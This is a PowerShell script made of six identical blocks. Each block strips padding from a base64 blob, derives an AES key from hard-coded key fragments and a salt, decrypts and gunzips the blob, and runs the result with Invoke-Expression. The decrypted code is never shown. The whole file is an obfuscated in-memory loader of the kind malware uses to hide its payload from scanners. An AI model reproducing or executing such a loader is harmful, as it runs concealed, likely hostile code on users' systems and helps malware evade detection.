$base64coded = "aILxlK1PwXXHVN0ooR9F9dJ6fLl5KkkVYutKXisk/j5BlzwyuZsDNtwwM9jWUYkUpIxz3ZRcwOwGCkrE8eEogxT3XKGqikazbgEaqUyi0jOL9D2NRf0nZa6IzEZZfCF+YdICsYhIR5OdugtFdb+QIOJKhWwjFArhB6bYW4AW+3MNRQ61yt8mklu6DUb7JeC5hhdDl3t3Dmw+0LhD5S6h+8vf66a1xKFl8glwrx8/Dd8n4GcWdmbgNaI/pKesuf4b02LyZspIv1uoAxtuP3DZuseBsduA6TbQAFSAtVdCKSoOs2Ic3UDDkaN4gqnJHWlQW4/Y0cU2dG7NEQauMDKVw/RvPS9NFNvWGQ7xo3phlgwQycgI+e1dlnu3k5SzSeXh1XHpKV+q4rPtEfW+SvEyNcAVdBLbvHP6fvosZuEndI4z3VPVkRs/fvUnYBMnC2eVKwV4HXu69w+gwL0rlOWPk16qo+8M6AaX3GdcEOeJ4KfmdhkCdNtKtYQo2Oseywp77GUNQKIvY705D9HuIjdnO/1THHFt4gw2LZAWrRMok7My2uOMe6vwRxzi05ryFRO9Z2xm532ZcccrKmpVQAvG0+vKG8dWNuT1oCe5P7ZqD1w1F4jdCRkfOCUG8wGJM83+VmAdoqndLRMZhhEamm28Db/BSXycaSqs250ycAKbwTavIaECUvb3DtrP2Dpuk4eIWNGm2qURaQcbQavIbL6BY7nY4RQorOUmy9bByWfQax+LjQbTRRtHEIVCZUBtCH6W+tsGKlfn7W+iTpvTXT2+6TGTvgB6JiTDauQLXdC645AnNGIKVTXFsvdwpyN3lGGhwWudWpLOwud+vaCNX7bWmUptETsXX1ltJtmlrCAZ0eXJrOS+ClTSayiG5nL5y0itW1coLNthGjLlmaeciQ8QKSKJT+BETV+11KIDSzuw5SueQhuuMrYVU2ES3yLqXYJ7orICbdgp6z/YZ3QlXcFqc3b7akovfK8wL8mPNdQo/V0P5Z80CtH+aMGXxUxoFy645vcTj8HG9DYw+QnREKDt+UxL8KGergzblqCF3W6fwfA8njKyPzYxgjt0cyovYhym2jY0cZl0kNnlW0saOwrRjtw9dWgOoiu7Z3M8i88RRiiLTieTh/bZvVBA3Aa0AU53Lm3S1towbb3r4gEAqhhUVtClz6V/MM23fck9amHhEjxWvWENtrx+/R3juHKohUXvoMSzecJUUSeRytbEUQr7gDIxZk/eJ5Hwxwp9L6Q5Cl4bsF35g6Xb4w1NcA0LzucWxj9+QQvRfIy17awp0E7TgofF2VrFpTnRQBOvlmGhicTC+7yItEHuyqT3pk4Vih1w5kw4MXQroCfMH2pG41e/mPEvP2bqsv9mQd0eNYP4kFAl59+HKOHVQjX8GXMM/kTRamS5yZULgGroJJQRIybSVLlDLHIiF8epo+bIUVtK31mZ9HYJouZt0r3jLRGjH9253NjqRgC82pktDIOKLhc1dCbehKq6mJm3kdTHAlIJsfs4dIeCvUYA5wMwpcXLfzndO1mqGuA2cNn8+wOITJnYMAeiR88XQyZt0NHyxss/zQkxHAWdtOIq1NgQT2uiNhQeXx9XMF2xZ8zFwyI9SDB068JUnnJwOus+w/+FYNrPNBE+GAylwP4RVrL1xQJ+u0tmSSOhbLM8AN3VE1mbtOA4rQvlvrkpbnwjen5zznmPfIWhbuVBdogNyBiOHhJIaSab1Dx4rS8fUEr17kxmSIAMDErmb+cGMPCeBjEx0l9cSKkYP4eTcPeYoYC3p8X4qwUesO763jb7zn0=IAlP9lqS8AVesafzrBsPaW38RL0oqcwl"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "eeJsXD3VT2a7iFMF"
$key2 = "4QK0Zm3Qri61BgF8"
$key3 = "AGAuSHwl7pZo1uQL"
$fullKey = $key1 + $key2 + $key3
$salt = "nBYiV2b8wVrdqsCY"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "qGCve1NYklJH6BIV"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "r8gUUHxzAWYngqdtQa6VdG3sYxP8uXPFrgT21DpUh/jSqErITT8bjrhRwRK66jm4FgTU4zspyNIavlyjNUzhhi1SrhIbKHRAnzMLXtgPTqshDMqLzVPL2/2jdRE9R0aL3LtGwdHzYYcHZ+wL195ob/X4v+pd95NwqdjgZ5L4KzzTn3l4sDGDrLOzpPIeLgTz0WqaIaUwRKnYw2T9KOlVat6ltJOmQjnKFtCTW1zYEfGg3SmJk+5GeDJcDL0fzq+P39NGnGezt5uwAaxVyFrcX9yRHlx7pIhGj91Zl+v1IT2JZ7lX1RF4yNlBf+5ds5CUYFvVZreReGtCDXhNVBi011dfTNtQtXbkVKUbcym1uDd9ku6pYbtCkrqpPBG8ui+ybxaUbOzea1p5VuP/d9Ji3DNgxNWMzpccvp5NDK+BoAT+ugFSesHPzc7yr3rrUatgMTvWQ2ZynQIzaGM+GFQyYyIadq7t7Wc29EJhOpK2MMIgtwNIJG/gFX7YB4tfbR4pODh8vUhXXRgLdvgvHtWzBD8lXZm4ZaQysjI7t20NUOebQZsLEK13S47UDItVivlj/yLo4MfcbPUt/Uvpbk071xUMDyzRI1/kdYBb0EDgfCxB0Y9zanotTdlSDwVwpunAuarLlHHUdmkaOmeWGKAmyRzg5hqOVSqTCXdS4BZKKZvm7sjk6vbiyKqC5YPqsK7NVlW2OJwdh8a+rqqfl8loj8dq+XmXOh3b7JgLb3IUtRlLu+aIzkCDsm5tPFHyL3ReG6Ce0BIFnZuF+KmI4p57taB4sC1p4/630lehOu5nN7aKS6LTKHK8G2MzfVECVFeakhCKF/R+AKEOpvTPcITTt5+EqIY3XtyRjVyYhAkltd3ZvR4eybDZREg4kNJM/QEDjrq2XJ/mS9xKd22H43FloQKuvBla92JA/8NpViECi+pIOmA2XctqX0ipsUkfHglHjom9csLS/eK2JXU2o9XU92/dBTBSkfJDI2DQHx+kuPLbUOAyWG4wv0w/+xeroURa24L9n5mqMhF49tRH2v/tpoMlbyem8QPaDxTUMncFsKqyrFrbVtjXrtlt/kVm7o3uiM2N8IsNXsPmAg1gbYsHuFazku0OsleYuDl5i0W+v1dy3NQvqA60p7w3Cx6Dys977xAOiAedhWBU2q0K7+sUCHegmE1IHxmwY99oJXTIX+AwDNlPg5nf2Za4TrgfugH/oFE2H7K5GBSaEzhVDtC8L662Y9eKFvt+GwCUl60+/e4B7nUKvh0CGzqmEr0wobWjv8HZJC1Giaae+PTkzKnXu44d5hN8Mktt7LiGyfOcYjj2ykN7Q3qVd1h1K746n3SKTs++43DJDGM6firIrnuBviDe5ePWovOT5rP2SHNvZeDSqgwuQx1s7jbyI2182o8qdRWqMAj8VSNCydKsE3irADo6A6OP1lrkdpkXt+ShcSnhj/6HtAcD6GA7sYoyt2jrIKYxAAy8M3wmlDkXWpJdvHkcd5bpmNd26TSgSD/GKN53C3jFMjLcygvjVb05wBTE+llmx533DnYIxC5xw8fzkG0Bj+j8ZY4S0EO+UVMVE1gD0++LGcyj4fzGuRdau0nzBa3HlqxWBJrrE4oBub94vQlI2nhhR/ttLmsN6MPOqT7f+ekx+fXLWCpD+1o/cb4fAKACiNdAE3qLDbDnwyY957AJwPxNLMvWzxctGc8BJFMjYffPYstahIQKMxFfpsncFJV6SGQKHTLJw5wRF+FmdDwPUloZpUKHVVhvI1NNoSDk4iZClAtq7g==k9zjsAcUsy4rdZpdqhsD68w2r4H6yuuP"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "xyGmph9yNshUCQJV"
$key2 = "v1M74LAEkMqQ8JRd"
$key3 = "nzhJ7M6slSoYAKYE"
$fullKey = $key1 + $key2 + $key3
$salt = "snzvEDSpgeXOINqZ"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "RD4bzmnHoKIVnV2S"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "x6CbgmN0GxJf7hOqydY3HYhnPatS6469D8tqFem+jPPBMnBPhMutaAzVtNW+B+xS7iRpoy3QFC37rWNHKg2sE5sJIc3G8yfxdJqkplYp2F5eHeft3A5P4x6TfXtqLf3OHCpGrQtWUwLbYiEkUh/UVtgJPuXmYlUF/ZgH+RmbhIsr1KPsek2Le2rdKRbMYfRWQGu53Z8PLw19JIE6pWyiCLIn3iLaxPurRdHfnn1qapSb0ahqhq8VcZX7NS7tTtZQK5jVTrU1U5O+fU6sl2/FNFkjDTJh6sZ/pl83m6YRCElMorCzKsn2rJ/aTXEtfy9e4nSMMVbPX6+lX5wcwLweh/zyUeBlYnr/7uW/47MAijwPErhjSLhGGgyE8ro8Zy9U8IwUUbizYj+th5iyTgfJf3XpFpQQ75rFQJbDZz4IFVUTBGmbiWBcvgPrywyDGQKLCPtJ3crnJcTb0Tlgauzv8UKlHUVVc3G8Zi1XRsrOYAk6W8d+yNS+F/UZHT+z7HW0goLJmZBLyzxKH04qex9H9SMCKBYQsyI+GE9n7Gt+QNpk3Ql3q9aElO7Xtxa/JEa2lH5SfPnGjX0cgLTghuW49YSGfIqxYb+azmc049l43v0dwkgjScZBNXZX2W/p6tMuNW5RfrIN0lJsh12dMxgRf4/HJ9eZsKecnAsGEOiEx2aIvqwKWF6giCEfU/6WJUD3zk8GpQGqjOUg7qfcNEC5I7uREQUDVnCg6GNYvazZuhklv3eUa3XDiNw5p5v52edTI2jKdvpFK9c6l0wXe/5DtPogcZTc3aHlZLbzCzHIizZhJaysbuJKinymBRy73bCYV9hiR0R87ovr8ZFhi45412y5S7zPj9Z1bYchpow5tKPAHbbwwtNTgw3SpvARSj65cKZ3Sm6fHoJn1e9OninCBBEAruVz4wEZLb+LPT6fl0VfNcmBgSJRE9FMBAAHK3oJjMDPfvonlqFnL8H9TKkqX+dDgTMr5A53jV9Z0nCWj9N4UyigYq5lpiTk09VXOtJuhacK0wzPbUV6pGYAlnQfCuEq7o7kUXXLmz/g7uhKdJX1sD3iWuZNRKQ8ha+KJ06kFVFJi7fIH1K14UY2U1WlDr/GJxJkUY1G0GBbRC4J+66paFV/xMUs2Bfn+CRz+vxksU4VAaFGpjER6V4UnYdADvNhir/ohHsY6xMhKXf+1Q6kZR0o6wxuzynMDjuVjvyAIYwGF83Ov+bD8a5B2cAvIrBYxOqskQJkH3sIqToZliRuwidEzOtcV+rRCBOw+72ifyZEFjjwJXpFJhJedtbLdFW8yX+jenB9+x3GcptOGOh3yDW+LD090gqwhoGRQykRIaThQbuHB0aN7vZD7aD7JVXXZ8DROFG/Z+eXw7jnIeoS0kfVWZRz6bevvd7UtJpsYyjunguB/9wojuEWtEzTczDPUIpfYRvbDq9JiN7szg9pLqnJMbj52Ne2PgrWBGAWS+Qy9LUyI5rcv0rV0T3qUojaDjNgRvrX/ZxKcaP+qpZb31GyR7Vp2uNuJ/bn7ZPGwWZCaHQ/f49/2MV13hoK/ndHBgba2Ps7Ttyk8EpP9eiKB9EYNBy2ZGCu67AAlGRbsW9XZoyMtwDaUrU0PV65nCNdpK0+hxYgVih569F5zz3LwsWoLuc5Hyr+PV7t0Ht7b6+2ErF2dC7IURRjxvh6RN00l7nwJy1EUdULoFbfyJ4+Pk+0OV6+wjfW/rcKNXnECzwdArdETzsp6NfL2q13R59xkwH2pFfvfimsuUXbfL+rUGJDtPJDZqYUH92knoyfd8hMJSFT6so=Vvg7Ts1tPEpDSuxb8tgl1bQqK6lOpceX"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "dSMdtNhvmGGg0nj5"
$key2 = "0xqKoT23apkxIqSy"
$key3 = "SN3O3GhBdi7GUNTC"
$fullKey = $key1 + $key2 + $key3
$salt = "5cKG3oVfgsjFDtqZ"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "DDAaJX6uw4z4RdBP"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "UY5yXtvlk2NmkumkKLFBTtVD0dagZ7c4juevlm8Uw9PpSjwwtFXG9Hr5pmq4Hd1vYl/0lW562rg4ndimR0XZ/OThKUYvyakzPKB7J2bUUmWc3qqLHwbXek8wjNpwZQgU3dZ/Hiny8N9vFa9rUEGW2bWrq1VzPYVLj1dwiAF5E/D2os1mWDlorB4tpYV6rha8gdvAxOBQEjobaZKqXL5sZn+hpH316Up/BGlhV1izzZx42AV7sG61mX68e7l2NNXlhuOEr+T9sNwmYBLT/v4Yt/Cu8U5qfU4weGxtlToM25B6DgAiZ/hj7gFucng9JDyHNS45cxAPTJCaAujWNpDU0nsAlgW6j2k9lwJr5drpwDjr+JvaPIJLtLomfHBr7/EJ4ze/HHYwc6uTM1LBk7tcjfZ0YSW2NDbD/WAYKzM2/U6plO414Api+QS4ZHHUfXSTXK/hvM2E27VAqnp0jw0ssnyOti1PcTFWDiS75FHqokkqqoGe1r+wAEQe80vVG8xQ7kzS/qJ23ec6C+bB3g9x121+pUxoYfMKWizvxLOx67q+wG89U77i20MsFZ7e0AxMeCXvvXaudr+Ll+wH32xkKc2wUWpMZpVV1CMhyQNgvZJjGsevxDv58k+xfgLFWl08LOmWrYQjMYWSdSY0FjiNp+5/bQbTV92XoY6+NFbuCJVMO7ULXGToK2jpqRuqT6gyJNNFupXZ2as2/uirK56inxnenMv2qCyq00t3kus5e8IdfVEnSqcRGGNpadph9dyG9oYqKmm9eKnil+RiK+htT+eqiburHA8DRISLZYiy/EGz5mXkXAvS2bSO1BFfB0mRldZK+l08tTeXvZNa05cXUANaGWBT/tpIoG/+Rtz+rceHoKwXOqgWOtIRAlB8GpIVwGtcuG7seqjAM+th3QSUIVPIzfkv2C8RNm+l8Iw7SEO3DZz+vMqP5UttEwGDTbAXEaBuxIKmiS+O0aBac9wBWuKWGFzA2EXK8ue9lu66CCPZmZ01iYSrNKiOAgNeeLHjoo1bMnh7sLT56UY3LLlmCt4lsz9d78/zHef7lmvFpAL9IYN52WGjj8WYzW1TmkAzMGEV7teeoG1kXLlrr9kCWsEdWULI+1gLj36XTRYAHVj5Zacp2beLB+MdgIk3OLdZ2QevFQSIEhkhsjVD2BoyJ80sSs1SzJCr4fZOaNaB3gFxw/IGbolKDPERG+n+UUl0uu+Ilo9Hl0Z0qobk0ZE9IVMGeGwE8muJI/7xYpztBvRLLCHfc9Mzk51nJlgnJPm+0iH8umRZWLEmcD3pI10+LyHwpAF42lasankHG25Td1sRtrygbXPGe1BylkrJlqehCjHn1/fJXrby2R2skANfwV8E1xrHE2wYaVBcomjwx5c9KXjROoX1KcYg6BrnKSV4r43arZW/2gsjGNWTlYutcOP+xLEbuy1EitXwGjgcVEDVVXUyNd29+f6rB+unsQhkndDmgV+CBtWpsPOPFnCxNbzSjSPTo7/cU1MQ27l90Vwccl4/DJvEJCy85h5snLibj0Vfphhz4FV5aRgM97VbOWmSyokYs97nt/B/iPzlr6T+ZUMeDLvHmMdaqrCt5B1snv2W4mWAIhFYScEvzcSvIy0KdB0XUfOA5avCO4D0cXGHwLfEH2IrJUSMmmG8Htq2AAEzT+eZF2uOLDY44E4DdmYY1YoOmeSpbXqZnWYtmgZaPSDKJvpnprhJUyV+KTUFenvYq1FANtwhUziY1QL1tJfBBg8eADGfMQ4SEp6oecBPmStVkteX6sds7jVOCyI340OvgrPVyaA=he71ctKoEtxVItMIFNxo87LTml8S4urI"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "HWFIGXuDzYfo8oKs"
$key2 = "Pj8qAnON3PCRTxuq"
$key3 = "9u3Vcfolks3vPXVs"
$fullKey = $key1 + $key2 + $key3
$salt = "FOObpYjHSDJIUe3E"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "s1jckVnI8CvCX3hV"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "u63B8OiL8qqbtlnVlaqvckqrzLYKXvIRstymvnaqnwlpcjebYsNi6lYAolCqiSYsDLh0JcPJZFY60yPBRRVmEFPOSOCTYOiqd/sUxW+Bm9bN6Q1C3535d9EB0y/QfDBkv0znQb7O7jldZNo4ThYIDZ2aRfVKz5T3c10kIkWUPAza6ir5ARa7vyhtNaeTof6Jps+lXl34Zu90cvxCHNE9HlDv9NUbWx0Qshx1UKBHDQDtg9MgIK1ezAnHiz/txsREBQYDrpsoRgjhDQ1ovwh3a5/nqVeChnJGDuyNJt1vv7TMxtwYPyGd8snpOLgsZnajZCTOA/QMPoQ9KBcfH1DyJTJW8ILc5P5FtZPtJRO9k5BbJu3P9/2wudovitIWYAZo9LQVROW5LMIR+wtiszHuz1fcHMvbG++gABwp0OAtYqb50I35o5Nq9pSLnaTWOZZaVJAD7L8CX297wP6WKA4/8TbxG+6bPFomFHo/nYkLqxL2VQ+EGO9Q0SOnMBlw9yJ44YBH+wnJwqytVB/ieRljVS/UdOlBtDgskhGCrNbgrFNCx+dpTELuXL85MaG2sUCKnn9Wew1mjTXuiB8ToSri7IUVkErFZl5qajtp9DaFPC+NHRBWEHmuuIL6RGdmQUN3z2Udef1eKOEIxLIGz6F8kZqbTGngAktIFdINsz/VE2ss5Y6tayaHL1gcrcgHlx/diIDweqoVp5Hnb48GKfwhbGnm2Qbcai2bkblmQ2KTvBFibY7benrrm5GGV+JUmd2ux7V6vKOYiTVXicGXJMPSeSKxf/P8TtmU3j5cvAr4x0epI8jyL2g/kpKf7RU5+p+f37x9yDQKBHZ52zZcboyjTmwAReSlbH0kUtk/kNnhn40q89amdgWWYke80Mq8SHWdvrMzBXB8OFr416RMrIOFWiSQsg1erPFnN7v9BnguFEIt7qQtzs1TyRudVyIqnJSRAj8g2VEXg8cuWtj3i4Aw4pMuCmMpeeCG3AKGYYyx+bmwXu8YjSIqsX+xnHqqfS25+yh9xyuAMxzgy88FfXTv70CPXValpmllUMuxceUSz5ryzpHxZ9rQKC9f/+18fnR8dnLUPXnxPxhhWRLKAsf3roWNXTAlIFcm3x/8YLm9+5JKIJhNJL6AxqeAv57NDI0NeNWuDWWNtZJe8W0RJZANHSJadCxzkioRiw+HDRqJPmcG25+aO5bGwRKoxC/RFbHDwc7tHzOx6rLuAlQBSrnUUOFfcTnkjZZK/3CPw1BnVySATWGtlJlc1ZBWNFWPhgymRrfYD2W07fvnJAdUd2C5Vl+/h2NzrOQzYB9Z+8TuX3K0QVDbr5GVTZGgCq0u3P0rcDyjmL5SPaNSC3PuhhvfDYrGa1wwqW/XbduOGJ2mOr9CWt0IUEtdzYzl/sF2RNn0odkGgtEv3D2FsdMCSFovMQPX54OfCTq4IWMr3RQfew5dtZPLMZHuadUnkyUCUrL1Ek9iOpEQllFSJpSl39l85Dssbn88sInDEfjoUCFw6pfktcBBiKUBh53QbdX7UxMfhIHj+1ImgFcrdcWo47lZUL3ZxNCmHn+mEc6B/86LM3hx+eVtk6hkR5WjLVC4lXjdy6pIhO+WMHYF6IabXiZVMMujDRnFhej0jky1kpRyJVs6w1HTB8+VChVkf1bnLO00Vpwlwyy25wgtvW+n45PsThO9MOKUHmSTG0Us+HO4KnazyeZegSsNJEyDD62Tm1KKhm2nvKejjMYP3zC4NPr2S+sRREqKtT1HDUxS2obm72U1apE0XmHAWw==YNliOwVHJdNGyQB78AwAOGUnVMYnDMkz"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "pqqVGTnQjAVzg2al"
$key2 = "ZD10o6YqpnezNX48"
$key3 = "5hg5UbD7QyrGjoFj"
$fullKey = $key1 + $key2 + $key3
$salt = "E72vro9SMjwHjRDW"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "Qo53P9DhZYRXUgVF"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "yKFUgqDqx6qfOAuX0OemzST30SkQKvz0JSltdnibk0aiBgUCz2GEeeCD8OHa/FdHFQvEH3Zd+DVm44JkbvC2xKmfcSkyRWrSnvgrcGpvrOngD5wosA3SIQE09ayac/ydLN+1cI95PzafyGE07UC5IumgqunEsOsMaQANVE6N2BjVcBQaM/r5iriuGqpz3h3VRYm0SJTmQDu1qwQ9DcRUbdMwPHuVDRS/WDRCjr593YeC/ijzcLaYC9XdSE75heHaCKNPfK7TAExmgcgrB+yOBx9olVCSQW0DoqLl1oGnyfKb4ByuTV8FlxuatR53Dqlr7MAMNP6ozigRMO4N2O5C3VyU+S1JEQmKmYivjthqiOd9s/zKF5AzwlJNB0eyit4VTwHEUPPxBthdj5NRcL/8KsK2g0llqkdugkL5cXuN5njDAOoqekjIc28Xq1Kz279/q8X4xJ19lMZkjmeAbsihIslDm8mYBS92h/Xqujue7SVnjxB/AtIMQsFSXGI+6ztJIx78NsP8LPPTf7Kf9FGfGK5lTCFKFLPumPatj/CA3GWkr3gzNSUSuxE+WIdviAg1WxjikQuzguWjSGAje8AtUcdhrOqpwH++XngRDoFjkDfjbTt3ClsLGZg3O9eN0wRRsIN3QcHv6J0rat+8ICqtRhlvUixKkmqcv1urQI31SQG7eUJOCHaihjnx/E5E3j2OVTxe2irYUkmJsConP2gZmenuIpPiVIk3a5fO2LC+AzdORxVQnTnVO1nZTPc1/or+26XSy2ecndR+Q59CbjBsh7kTNVpXNkhYo0GJNQL+/aw3hAWRkZK1/0XSTAxEpIjdaLCwFJMja4Xy+YdZbrCFRAfqU1AXeLlYqHXBjCJQiOsz8kyOg8HAnt50s8EdcVgOZ+SUlY4d5xi7CaDsXD6HBNggJesjzP6K9bZbr4aHgXEaf8x+nBcjcZO80msRjAqLOx08njeo0KwMI+G8UMlQYkNOWPdvURgopeyb92K5qEmxT5UJpX3nW0NS5MIIGxWreqDvICk0MmxR+qMBW0S0q60h0jSa807FCbiGHpPLrgXdu7FgPY7CkdbFlpWngaxW4XlHJQRO2hPJT9Zm6JrhSIPkMtJeSjQQmOOMpJ1M/YcUt8njNJryCfFqbWTsJKjgCIslhJBuey3hCS70hLlPXxgQ4OizRNThmW3XWEvi+3hx8j9ZIfokjbFkEdumYR1t/MQusVgMDJMH1bf+gPPXlmF0oE40fRiNsUcQbb5qBMzOTQhU3vQ7BNaCt9Bb5MN4mXV7o17HVbgUexOLq0xkHrdzw03GLtw7w0lSj2he5oWx37GjPOqgJFAxyucq6B41MiycOgA3KLAucB483nKsLIIcpgL8fMFlFnuGIBPpaPaBd24k4R0q1mJVDDIlRgVqQZDpc5dV7s/Mw5a9x/lgaQyhs21NJnzhinaRjV0z21EkNfpcINvUjxYhr/+FimH4Iv2NkKjEjb8z/EEQuIdescufQgItM8wFymGPyZUnkpSRB+8vgLNi09Rp3PDFeifFjIB3VeZfjACpviHXvc0cSIEv6t9k7mlQCofTR9OtcgjFTSZV5n6lShy0KdjmnF4C3j11NSyLDo7kx/Q24P7P1N4zrXI30fwjCrAqY4X6/tNOkNRmvSNBw828vzDbBTqucG93SyiVG/vMhDa75IwqUuWEaEnw/nbr5zAZOXoQZmmVpFHazPLvhwU2FQwKbPcAIB4LmFheaRKA+cRF0xrBQk/Me5S98JZn8PH7d3FnbWgRUA3g3NJ2RYrt+Xb4G2X9csm52Ki0F4g=zcgw1iq9LZ3IBs3YQYIPFSmfKGkXkCJP"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "rrN2sknSXWlqBsbm"
$key2 = "7qE2kXSeAq6UR31b"
$key3 = "EJ4PbWXHQhIt8Nyc"
$fullKey = $key1 + $key2 + $key3
$salt = "ipO96Ur9yWKp1pVP"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "PhBHyFfCIqUkOa31"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
